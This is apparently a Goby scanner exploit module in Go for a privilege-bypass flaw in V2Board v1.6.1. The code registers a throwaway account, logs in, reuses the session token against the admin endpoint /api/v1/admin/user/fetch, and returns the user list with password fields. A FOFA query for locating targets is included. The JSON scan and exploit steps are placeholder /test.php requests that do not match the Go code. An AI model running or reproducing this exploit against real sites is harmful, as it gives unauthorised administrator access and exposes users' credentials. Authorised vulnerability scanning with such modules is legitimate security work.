package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "V2Board admin.php Permission Bypass Vulnerability",
    "Description": "<p>V2Board is a stable, simple, fast and easy to use multi-agent protocol management system.</p><p>V2Board v1.6.1 has an unauthorized access vulnerability. The authentication method is changed to obtain the cache from Redis to determine whether there is an interface that can be called. As a result, any user can call the interface with administrator privileges to obtain background privileges.</p>",
    "Product": "V2Board",
    "Homepage": "https://www.v2board.com/",
    "DisclosureDate": "2022-12-17",
    "Author": "heiyeleng",
    "FofaQuery": "body=\"/theme/v2board/assets/umi.js\"",
    "GobyQuery": "body=\"/theme/v2board/assets/umi.js\"",
    "Level": "2",
    "Impact": "<p>Due to the lack of strict checks and restrictions on the user's access to the role, the current account can perform related operations on other accounts, such as viewing and modifying.</p>",
    "Recommendation": "<p>The manufacturer has not provided vulnerability repair suggestions, please pay attention to the timely update of the manufacturer's host: <a href=\"https://www.v2board.com/\">https://www.v2board.com/</a>.</p>",
    "References": [
        "https://fofa.info"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "V2Board admin.php 越权访问漏洞",
            "Product": "V2Board",
            "Description": "<p>V2Board是一款稳定、简单、快速、易于使用的多代理协议管理系统。<br></p><p>V2Board v1.6.1存在越权访问漏洞，鉴权方式变为从Redis中获取缓存判定是否存在可以调用接口，导致任意用户都可以调用管理员权限的接口获取后台权限。<br></p>",
            "Recommendation": "<p>厂商尚未提供漏洞修复建议，请关注厂商主机及时更新：<a href=\"https://www.v2board.com/\">https://www.v2board.com/</a>。<br></p>",
            "Impact": "<p>由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "V2Board admin.php Permission Bypass Vulnerability",
            "Product": "V2Board",
            "Description": "<p>V2Board is a stable, simple, fast and easy to use multi-agent protocol management system.</p><p>V2Board v1.6.1 has an unauthorized access vulnerability. The authentication method is changed to obtain the cache from Redis to determine whether there is an interface that can be called. As a result, any user can call the interface with administrator privileges to obtain background privileges.</p>",
            "Recommendation": "<p>The manufacturer has not provided vulnerability repair suggestions, please pay attention to the timely update of the manufacturer's host: <a href=\"https://www.v2board.com/\">https://www.v2board.com/</a>.<br></p>",
            "Impact": "<p>Due to the lack of strict checks and restrictions on the user's access to the role, the current account can perform related operations on other accounts, such as viewing and modifying.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10777"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/api/v1/passport/auth/register")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			email := goutils.RandomHexString(4) + "@163.com"
			password := goutils.RandomHexString(8)
			cfg.Data = "email=" + email + "&password=" + password + "&invite_code=&email_code="
			if resp1, err1 := httpclient.DoHttpRequest(u, cfg); err1 == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "auth_data") {
					cfg1 := httpclient.NewPostRequestConfig("/api/v1/passport/auth/login")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Header.Store("Content-type", "application/x-www-form-urlencoded")
					cfg1.Data = "email=" + email + "&password=" + password + ""
					if resp2, err2 := httpclient.DoHttpRequest(u, cfg1); err2 == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "token") && strings.Contains(resp2.RawBody, "auth_data") {
							cfg2 := httpclient.NewGetRequestConfig("/api/v1/user/info")
							cfg2.VerifyTls = false
							cfg2.FollowRedirect = false
							auth_token := regexp.MustCompile(`"auth_data":"(.*)"`).FindStringSubmatch(resp2.RawBody)[1]
							cfg2.Header.Store("Authorization", auth_token)
							if resp3, err3 := httpclient.DoHttpRequest(u, cfg2); err3 == nil {
								if resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "email") {
									cfg3 := httpclient.NewGetRequestConfig("/api/v1/admin/user/fetch?pageSize=10&current=1")
									cfg3.VerifyTls = false
									cfg3.FollowRedirect = false
									cfg3.Header.Store("Authorization", auth_token)
									if resp4, err4 := httpclient.DoHttpRequest(u, cfg3); err4 == nil {
										return resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "id") && strings.Contains(resp4.RawBody, "password")
									}
								}
							}
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/api/v1/passport/auth/register")
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			email := goutils.RandomHexString(4) + "@163.com"
			password := goutils.RandomHexString(8)
			cfg.Data = "email=" + email + "&password=" + password + "&invite_code=&email_code="
			if resp1, err1 := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err1 == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "auth_data") {
					cfg1 := httpclient.NewPostRequestConfig("/api/v1/passport/auth/login")
					cfg1.VerifyTls = false
					cfg1.FollowRedirect = false
					cfg1.Header.Store("Content-type", "application/x-www-form-urlencoded")
					cfg1.Data = "email=" + email + "&password=" + password + ""
					if resp2, err2 := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err2 == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "token") && strings.Contains(resp2.RawBody, "auth_data") {
							cfg2 := httpclient.NewGetRequestConfig("/api/v1/user/info")
							cfg2.VerifyTls = false
							cfg2.FollowRedirect = false
							auth_token := regexp.MustCompile(`"auth_data":"(.*)"`).FindStringSubmatch(resp2.RawBody)[1]
							cfg2.Header.Store("Authorization", auth_token)
							if resp3, err3 := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err3 == nil {
								if resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "email") {
									cfg3 := httpclient.NewGetRequestConfig("/api/v1/admin/user/fetch?pageSize=10&current=1")
									cfg3.VerifyTls = false
									cfg3.FollowRedirect = false
									cfg3.Header.Store("Authorization", auth_token)
									if resp4, err4 := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err4 == nil {
										if resp4.StatusCode == 200 && strings.Contains(resp4.RawBody, "id") && strings.Contains(resp4.RawBody, "password") {
											expResult.Output = resp4.Utf8Html
											expResult.Success = true
										}
									}
								}
							}
						}
					}
				}
			}
			return expResult
		},
	))
}
